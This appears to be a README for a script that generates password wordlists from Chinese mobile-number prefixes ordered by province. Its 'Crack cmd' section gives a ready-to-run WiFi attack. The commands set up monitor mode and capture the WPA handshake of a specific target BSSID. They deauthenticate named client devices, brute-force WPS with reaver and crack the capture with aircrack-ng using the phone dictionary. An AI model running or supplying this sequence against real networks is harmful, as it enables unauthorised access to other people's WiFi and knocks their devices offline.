# Generate dictionary based on Chinese phone number

## Usage
Set priority in table `province_priority` to adjust the sequence of the province in dict, priority 0 will not be generated.

- `load_phone.py` loads phone numbers to sqlitedb
- `phone_dict_gen.py` will generate the phone dicts

## Crack cmd
```bash
# wlan interface
wlan_mon_if=wlan1mon
# Enable monitor mode
sudo airmon-ng start ${wlan_mon_if}

# Sniff
# Sniff wifi, -c CHANNEL
rm -fr *.cap && sudo airodump-ng --wps -w wpa ${wlan_mon_if} -c 6

###################################################################
# tgt is the target wifi to crack, clientvic is the client to deauth
tgt=8C:18:50:56:2B:28

# Collect the handshake cap
sudo rm -fr *.cap && sudo airodump-ng --bssid ${tgt} -w ${tgt}.cap ${wlan_mon_if} -c 2

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
# Deauth the client
tgt=8C:18:50:56:2B:28

clientvic=14:5F:94:8C:AA:BF
sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} ${wlan_mon_if}
clientvic=74:E2:F5:33:23:D4
sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} ${wlan_mon_if}

###################################################################

sudo reaver -i ${wlan_mon_if} -b ${tgt} –a –S –vv –d 0  -c 11


caps=BC-5F-F6-B2-6B-02_handshake.cap

# Check SSID
aircrack-ng  -J wpahash ${caps}

# Crack
aircrack-ng -l wpakey.txt -w ~/phone_dict_gen/phone.dict ${caps}
```


## Phone data src
https://gitee.com/oss/phonedata/attach_files